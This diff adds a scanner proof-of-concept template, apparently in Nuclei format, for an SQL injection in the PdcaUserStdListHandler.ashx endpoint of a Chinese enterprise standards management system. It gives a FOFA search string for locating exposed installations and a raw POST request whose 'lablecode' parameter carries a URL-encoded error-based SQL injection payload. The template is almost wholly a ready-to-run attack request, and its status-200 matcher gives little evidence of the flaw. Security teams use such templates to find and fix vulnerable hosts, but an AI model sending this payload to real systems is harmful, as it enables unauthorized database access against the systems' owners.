@@ -1,0 +1,32 @@
+id: poc-7923629525
+info:
+  name: 润申信息企业标准化管理系统 PdcaUserStdListHandler.ashx 存在SQL注入漏洞_pz4zomfqrpgg4on1
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: sqli,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: body="PDCA/js/_publicCom.js"
+http:
+- raw:
+  - 'POST /PDCA/ashx/PdcaUserStdListHandler.ashx?action=GetDataBy HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Content-Length: 232
+
+    Connection: close
+
+
+    code=1&lablecode=-9458%29+OR+5511+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285511%3D5511%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+XeuQ&LableName=&page=1&rows=20'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
